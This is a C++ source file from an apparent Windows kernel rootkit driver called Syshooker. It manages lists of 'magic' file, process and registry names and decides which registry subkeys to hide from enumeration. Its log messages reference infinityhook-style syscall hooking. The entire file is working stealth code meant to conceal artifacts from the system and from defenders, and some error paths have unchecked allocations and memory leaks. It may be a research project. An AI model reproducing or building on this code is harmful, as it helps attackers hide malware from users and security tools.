#include "utils.h"
#include "stdafx.h"
#include "../Syshooker-Client/SyshookerCommon.h"
#include "Settings.h"

NameNode* CreateNameNode(const wchar_t* NameBuffer, const size_t NameLength) {
    if (!NameBuffer || NameLength <= 0) {
        kprintf("[-] CreateNameNode: NameBuffer (%p) or NameLength (%llu) invalid.\n", NameBuffer, NameLength);
        return nullptr;
    }

    NameNode* result = (NameNode*)ExAllocatePool(NonPagedPool, sizeof(NameNode));
    if (!result) {
        kprintf("[-] CreateNameNode: Allocation failed for NameNode struct.\n");
        return nullptr;
    }

    result->NameBuffer = (wchar_t*)ExAllocatePool(NonPagedPool, (NameLength + 1) * sizeof(wchar_t)); // NameLength + 1 to make space for \0
    if (!result->NameBuffer) {
        kprintf("[-] CreateNameNode: Allocation failed for NameNode->NameBuffer.\n");
        ExFreePool(result);
        return nullptr;
    }

    // copy name from NameBuffer to result->NameBuffer (will be null-terminated)
    wcsncpy(result->NameBuffer, NameBuffer, NameLength + 1);
    result->NameLength = NameLength;
    result->Next = nullptr;

    return result;
}

void FreeNameNode(NameNode* nn) {
    ExFreePool(nn->NameBuffer);
    ExFreePool(nn);
    return;
}

NTSTATUS appendNameNode(Target target, NameNode* NewNameNode) {
    NameNode* llHead = nullptr;
    if (target == TARGET_FILE) {
        if (Settings.FileMagicNamesHead == nullptr) {
            Settings.FileMagicNamesHead = NewNameNode;
            return STATUS_SUCCESS;
        }
        else {
            llHead = Settings.FileMagicNamesHead;
            kprintf("[+] syshooker IRQ_WRITE: should add to FILE. Head is now %p\n", llHead);
        }
    }
    else if (target == TARGET_PROCESS) {
        if (Settings.ProcessMagicNamesHead == nullptr) {
            Settings.ProcessMagicNamesHead = NewNameNode;
            return STATUS_SUCCESS;
        }
        else {
            llHead = Settings.ProcessMagicNamesHead;
            kprintf("[+] syshooker IRQ_WRITE: should add to PROCESS. Head is now %p\n", llHead);
        }
    }
    else if (target == TARGET_REGISTRY) {
        if (Settings.RegistryMagicNamesHead == nullptr) {
            Settings.RegistryMagicNamesHead = NewNameNode;
            return STATUS_SUCCESS;
        }
        else {
            llHead = Settings.RegistryMagicNamesHead;
            kprintf("[+] syshooker IRQ_WRITE: should add to REGISTRY. Head is now %p\n", llHead);
        }
    }
    else {
        return STATUS_INVALID_PARAMETER;
    }

    // traverse the linked list to the end
    while (llHead->Next != nullptr) {
        if (wcscmp(NewNameNode->NameBuffer, llHead->NameBuffer) == 0) { // check for duplicates
            kprintf("[+] syshooker: skipping adding duplicate: %ws\n", NewNameNode->NameBuffer);
            return STATUS_DUPLICATE_NAME;
        }
        llHead = llHead->Next;
    }
    // don't forget to check the last node for duplicates
    if (wcscmp(NewNameNode->NameBuffer, llHead->NameBuffer) == 0) {
        kprintf("[+] syshooker: skipping adding duplicate: %ws\n", NewNameNode->NameBuffer);
        return STATUS_DUPLICATE_NAME;
    }

    // append the new node
    llHead->Next = NewNameNode;
    return STATUS_SUCCESS;
}

NTSTATUS removeNameNode(Target target, const wchar_t* NameToRemove) {
    NameNode* CurrentNN = nullptr;
    NameNode* PreviousNN = nullptr;
    NameNode** TargetChainHead = nullptr;
    if (target == TARGET_FILE) {
        if (Settings.FileMagicNamesHead == nullptr) {
            return STATUS_SUCCESS; // there are no NameNodes in this target, remove is kind-of successful (it ensures that there are no records with the name)
        }
        else {
            CurrentNN = Settings.FileMagicNamesHead;
            TargetChainHead = &Settings.FileMagicNamesHead;
        }
    }
    else if (target == TARGET_PROCESS) {
        if (Settings.ProcessMagicNamesHead == nullptr) {
            return STATUS_SUCCESS;
        }
        else {
            CurrentNN = Settings.ProcessMagicNamesHead;
            TargetChainHead = &Settings.ProcessMagicNamesHead;
        }
    }
    else if (target == TARGET_REGISTRY) {
        if (Settings.RegistryMagicNamesHead == nullptr) {
            return STATUS_SUCCESS;
        }
        else {
            CurrentNN = Settings.RegistryMagicNamesHead;
            TargetChainHead = &Settings.RegistryMagicNamesHead;
        }
    }
    else {
        kprintf("[-] syshooker: removeNameNode: no such target: %d\n", target);
        return STATUS_INVALID_PARAMETER;
    }

    // traverse the linked list
    while (CurrentNN != nullptr) {
        if (wcscmp(NameToRemove, CurrentNN->NameBuffer) == 0) { // check if the current NameNode should be removed
            // yes, it should be removed
            kprintf("[+] syshooker: removeNameNode: should remove this node: %ws\n", CurrentNN->NameBuffer);

            // handle linked list node removal
            if (PreviousNN == nullptr) {
                // fix the head address in the Settings structure
                *TargetChainHead = CurrentNN->Next; // this will be null in case that there is only 1 node and we are removing it, or the next node will become the first
            }
            else {
                // fix the next struct pointer in the previous node
                PreviousNN->Next = CurrentNN->Next;
            }

            // free the 'unlinked' node
            FreeNameNode(CurrentNN);

            // return from the function (because our linked list guarantees no duplicates, so there is no reason to keep traversing it)
            return STATUS_SUCCESS;
        }

        // move pointers
        PreviousNN = CurrentNN;
        CurrentNN = CurrentNN->Next;
    }

    kprintf("[+] syshooker: removeNameNode: name %ws was not found in our chains\n", NameToRemove);
    return STATUS_SUCCESS;
}

int matchMagicNames(const wchar_t* NameToCheck, enum Target target) {
    //kprintf("[+] syshooker: matchMagicNames: %ws\n", NameToCheck);
    NameNode* nn = nullptr;
    switch (target) {
    case TARGET_FILE:
        nn = Settings.FileMagicNamesHead;
        break;
    case TARGET_PROCESS:
        nn = Settings.ProcessMagicNamesHead;
        break;
    case TARGET_REGISTRY:
        nn = Settings.RegistryMagicNamesHead;
        break;
    default:
        return 0;
    }

    while (nn != nullptr) {
        if (wcscmp(NameToCheck, nn->NameBuffer) == 0) {
            kprintf("[+] syshooker: found match in matchMagicNames: %ws %ws!\n", NameToCheck, nn->NameBuffer);
            return 1;
        }
        nn = nn->Next;
    }
    return 0;
}

/*
int matchMagicNamesSubstring(const wchar_t* NameToCheck, enum Target target) {
    // kprintf("[+] syshooker: matchMagicNamesSubstring: %ws\n", NameToCheck);
    NameNode* nn = nullptr;
    switch (target) {
    case TARGET_FILE:
        nn = Settings.FileMagicNamesHead;
        break;
    case TARGET_PROCESS:
        nn = Settings.ProcessMagicNamesHead;
        break;
    case TARGET_REGISTRY:
        nn = Settings.RegistryMagicNamesHead;
        break;
    default:
        return 0;
    }

    while (nn != nullptr) {
        if (wcsstr(NameToCheck, nn->NameBuffer) != nullptr) {
            kprintf("[+] syshooker: found substring in matchMagicNamesSubstring: %ws %ws!\n", NameToCheck, nn->NameBuffer);
            return 1;
        }
        nn = nn->Next;
    }
    return 0;
}
*/

size_t GetSettingsDumpSizeBytes() {
    size_t result = 0;

    // Files
    NameNode* nn = Settings.FileMagicNamesHead;
    if (nn == nullptr) result += sizeof(wchar_t); // there will be \0 even if the chain is empty
    while (nn != nullptr) {
        kprintf("[+] syshooker: calculating settings dump: %ws\n", nn->NameBuffer);
        result += (nn->NameLength + 1) * sizeof(wchar_t); // + 1 because of terminating character
        nn = nn->Next;
    }

    // Processes
    nn = Settings.ProcessMagicNamesHead;
    if (nn == nullptr) result += sizeof(wchar_t); // there will be \0 even if the chain is empty
    while (nn != nullptr) {
        kprintf("[+] syshooker: calculating settings dump: %ws\n", nn->NameBuffer);
        result += (nn->NameLength + 1) * sizeof(wchar_t); // + 1 because of terminating character
        nn = nn->Next;
    }

    // Registry
    nn = Settings.RegistryMagicNamesHead;
    if (nn == nullptr) result += sizeof(wchar_t); // there will be \0 even if the chain is empty
    while (nn != nullptr) {
        kprintf("[+] syshooker: calculating settings dump: %ws\n", nn->NameBuffer);
        result += (nn->NameLength + 1) * sizeof(wchar_t); // + 1 because of terminating character
        nn = nn->Next;
    }

    return result + 1; // +1 because the first byte indicates the syshooker status
}

void PrintRegistryKeyHandleInformation(HANDLE KeyHandle, const wchar_t* CallingFunctionName) {
	// TODO - dynamic allocation
	PVOID KeyInformationBuffer[100] = { 0 };
	size_t BufferSize = 100 * sizeof(PVOID);
	ULONG ResLength = -1;
	NTSTATUS KeyResult = ZwQueryKey(KeyHandle, KeyNameInformation, KeyInformationBuffer, BufferSize, &ResLength);
	if (NT_SUCCESS(KeyResult)) {
		PKEY_NAME_INFORMATION KeyNamePtr = (PKEY_NAME_INFORMATION)KeyInformationBuffer;
		wchar_t HandleNameBuffer[MAX_PATH_SYSHOOKER] = { 0 };
		for (size_t i = 0; i < KeyNamePtr->NameLength / 2 && i < MAX_PATH_SYSHOOKER; ++i) {
			HandleNameBuffer[i] = KeyNamePtr->Name[i];
		}
		kprintf("[+] infinityhook: ZwQueryKey called from %ws: NameLength: %d, Name: %ws\n", CallingFunctionName, KeyNamePtr->NameLength, HandleNameBuffer);
	}
	else {
		kprintf("[-] infinityhook: ZwQueryKey not success: %x\n", KeyResult);
	}
}

// enumerates registry key (from KeyHandle) to find out if it contains anything that should be hidden
NTSTATUS RegistryKeyHideInformation(_In_ HANDLE KeyHandle, _Out_ PULONG HideSubkeyIndexesCount, _Out_ PULONG OkSubkeyIndexesCount, _Out_ PULONG* OkSubkeyIndexes) {
    UNREFERENCED_PARAMETER(OkSubkeyIndexes);

    // initialize memory
    *HideSubkeyIndexesCount = 0;
    *OkSubkeyIndexesCount = 0;

    NTSTATUS status = -1;
    ULONG resultLength = 0;
    PKEY_FULL_INFORMATION keyInfo = NULL;
    PKEY_BASIC_INFORMATION subKeyInfo = NULL;

    // required buffer size
    status = ZwQueryKey(KeyHandle, KeyFullInformation, NULL, 0, &resultLength);
    if (status != STATUS_BUFFER_TOO_SMALL) {
        kprintf("[-] RegistryKeyHideInformation: Should not have happened, ZwQueryKey status: %d.\n", status);
        return status;
    }

    // key information malloc
    keyInfo = (PKEY_FULL_INFORMATION)ExAllocatePool(NonPagedPool, resultLength);
    if (!keyInfo) {
        kprintf("[-] RegistryKeyHideInformation: Failed to allocate keyInfo buffer.\n");
        return STATUS_INSUFFICIENT_RESOURCES;
    }

    // get subkey count information
    status = ZwQueryKey(KeyHandle, KeyFullInformation, keyInfo, resultLength, &resultLength);
    if (!NT_SUCCESS(status)) {
        ExFreePool(keyInfo);
        kprintf("[-] RegistryKeyHideInformation: ZwQueryKey call failed.\n");
        return status;
    }

    //kprintf("[+] RegistryKeyHideInformation: ZwQueryKey subkeys count: %d.\n", keyInfo->SubKeys);
    ULONG SubKeysCount = keyInfo->SubKeys;
    ExFreePool(keyInfo);
    
    // allocate memory for OK indexes
    *OkSubkeyIndexes = (PULONG)ExAllocatePool(NonPagedPool, SubKeysCount * sizeof(ULONG));
    memset(*OkSubkeyIndexes, 0, SubKeysCount * sizeof(ULONG)); // erease memory

    // Retrieve subkeys using ZwEnumerateKey
    ULONG KeyIndex = 0;
    while (1) {
        if (*OkSubkeyIndexesCount > SubKeysCount || KeyIndex > SubKeysCount) {
            kprintf("[-] RegistryKeyHideInformation: Index out of bound (%d %d %d). Should not have happened.\n", KeyIndex, *OkSubkeyIndexesCount, SubKeysCount);
            return STATUS_FAIL_CHECK;
        }

        // get buffer size
        status = ZwEnumerateKey(KeyHandle, KeyIndex, KeyBasicInformation, NULL, 0, &resultLength);
        if (status == STATUS_NO_MORE_ENTRIES) {
            break;
        }
        else if (!NT_SUCCESS(status) && status != STATUS_BUFFER_TOO_SMALL) { // we want to see STATUS_BUFFER_TOO_SMALL
            kprintf("[-] RegistryKeyHideInformation: ZwEnumerateKey call failed %x.\n", status);
            return status;
        }

        subKeyInfo = (PKEY_BASIC_INFORMATION)ExAllocatePool(NonPagedPool, resultLength);
        if (!subKeyInfo) {
            kprintf("[-] RegistryKeyHideInformation: Failed to allocate subKeyInfo buffer.\n");
            return STATUS_INSUFFICIENT_RESOURCES;
        }

        status = ZwEnumerateKey(KeyHandle, KeyIndex, KeyBasicInformation, subKeyInfo, resultLength, &resultLength);
        if (NT_SUCCESS(status)) {
            
            // validate if this key is OK or not
            wchar_t SubKeyNameBuffer[MAX_PATH_SYSHOOKER] = { 0 };

            // ->NameLength / 2 , because the field is size in bytes but contains wchars (which consist of 2 bytes each)
            for (size_t i = 0; i < subKeyInfo->NameLength / 2 && i < MAX_PATH_SYSHOOKER - 1; ++i) { // - 1 to leave space for null-terminator
                SubKeyNameBuffer[i] = subKeyInfo->Name[i];
            }

            if (matchMagicNames(SubKeyNameBuffer, (Target)TARGET_REGISTRY)) {
                kprintf("[+] RegistryKeyHideInformation (SHOULD HIDE): subKey index %d: %ws\n", KeyIndex, SubKeyNameBuffer);
                *HideSubkeyIndexesCount += 1;
            }
            else {
                (*OkSubkeyIndexes)[*OkSubkeyIndexesCount] = KeyIndex;
                *OkSubkeyIndexesCount += 1;
            }
        }
        else {
            kprintf("[-] RegistryKeyHideInformation: Second call to ZwEnumerateKey failed (index %d). Shouuld not have happened...\n", KeyIndex);
            ExFreePool(subKeyInfo);
            return status;
        }

        ExFreePool(subKeyInfo);
        KeyIndex++;
    };

    return STATUS_SUCCESS;
}